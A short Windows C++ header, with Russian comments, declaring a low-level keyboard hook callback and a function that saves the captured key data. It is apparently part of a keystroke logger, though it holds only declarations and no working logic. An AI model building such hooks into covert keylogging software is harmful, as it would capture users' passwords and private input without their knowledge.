#pragma once
#include<Windows.h>
#include<iostream>
#include<fstream>

int Save(KBDLLHOOKSTRUCT kbData);

LRESULT CALLBACK KeyboardProc
(
	int code,		// код hook-точкивыфвфыв
	WPARAM wParam,	// код виртуальной клавиши
	LPARAM lParam	// информация о сообщении нажатой клавиши
);